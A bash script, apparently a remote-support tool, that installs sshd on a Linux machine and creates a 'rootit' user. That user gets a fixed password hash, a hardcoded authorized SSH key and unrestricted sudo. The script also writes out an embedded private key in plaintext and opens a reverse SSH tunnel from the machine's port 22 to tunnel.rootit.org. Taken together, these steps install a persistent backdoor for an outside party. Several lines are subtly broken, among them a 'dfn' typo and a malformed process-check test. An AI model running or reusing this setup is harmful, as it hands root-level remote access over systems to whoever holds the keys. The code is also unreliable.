#!/bin/bash
# GNU/Linux reverse tunnel setup

echo "ROOT IT Reverse Tunnel Script
Licensed GPLv3
https://www.gnu.org/licenses/gpl-3.0.en.html"

# Ensure that sshd is installed
# Be intelligent about different distros
if [ -z "$(which sshd)" ]; then
  if command -v yum &> /dev/null; then
    yum install -y openssh-server
  elif command -v dnf &> /dev/null; then
    dfn install -y openssh-server
  elif command -v zypper &> /dev/null; then
    zypper install -y openssh
  elif command -v apt &> /dev/null; then
    apt update
    apt install -y openssh-server
  elif command -v pacman &> /dev/null; then
    pacman -Sy --noconfirm openssh
  else
    echo "No supported package manager found."
    exit 1
  fi
fi

# Ensure that sshd is running
# Debian-based distros call it ssh.service and everyone else calls it sshd.service
# Debian-based distros used to provide an alias but stopped doing that recently
if command -v apt; then
  systemctl start ssh
else
  systemctl start sshd
fi

USERNAME="rootit"
if ! getent passwd ${USERNAME}; then
  # Create user for login and set password
  PWHASH='$6$48Zx6G0NygD2MnJ/$W4b49pYQq6pbkZjlZGxjCnwtbt0iLYkllYHl6VxEsBFCCLXDVJw/5l6C7zsLlEASINkIKk4p5GnlH8aVU/VwF.'
  useradd "${USERNAME}"
  echo "${USERNAME}:${PWHASH}" | chpasswd -e
  # Set SSH key
  USERHOMEDIR="$(getent passwd ${USERNAME} | cut -d ':' -f 6)"
  USERSSHDIR="${USERHOMEDIR}/.ssh/"
  mkdir "${USERSSHDIR}"
  echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAII58SfewaHZEyr1kmQcImuKPVS8VoMXvvdJQDP/y20aH" > "${USERSSHDIR}/authorized_keys"
  chown -R ${USERNAME} "${USERSSHDIR}"
  chmod -R go-rwx "${USERSSHDIR}"
  # Add to sudoers
  echo "rootit ALL=(ALL) ALL" > /etc/sudoers.d/rootit
  chmod o-rwx /etc/sudoers.d/rootit
fi

# Set up key for reverse tunnel jiggery pokery
TUNNELKEY="/etc/ssh/rootit_tunnel_key"
if [ ! -f ${TUNNELKEY} ]; then
  echo "-----BEGIN OPENSSH PRIVATE KEY-----
  b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
  QyNTUxOQAAACClKObO1MLLM5FHCD0ogMoei9ld3PdYl0sQehUVGgTTKgAAAKhyqVMacqlT
  GgAAAAtzc2gtZWQyNTUxOQAAACClKObO1MLLM5FHCD0ogMoei9ld3PdYl0sQehUVGgTTKg
  AAAEBsBsATUgWGfb7k2xCLnZKr9L4W0aVWEBgdt92Ofzx8Q6Uo5s7UwsszkUcIPSiAyh6L
  2V3c91iXSxB6FRUaBNMqAAAAHmJlZXBlckBsYXB0b3AuaGVqbW8ucHVua3RvLm9yZwECAw
  QFBgc=
  -----END OPENSSH PRIVATE KEY-----" > ${TUNNELKEY}
  chmod go-rwx ${TUNNELKEY}
  chown rootit ${TUNNELKEY}
fi

# Create reverse tunnel
# Choose a random port number. Very unlikely to have duplicates
TUNNELHOST="tunnel.rootit.org"
TUNNELHOST_PORT="523"
if [ ! ps -ef | grep "${TUNNELKEY}" | grep -v grep ]; then
  RANDOM_PORT=$((2000 + RANDOM % (65535 - 2000 + 1)))
  echo "PORT NUMBER IS ${RANDOM_PORT}"
  sudo -u rootit ssh -i ${TUNNELKEY} ${USERNAME}@${TUNNELHOST} -p ${TUNNELHOST_PORT} -N -R ${RANDOM_PORT}:localhost:22
fi
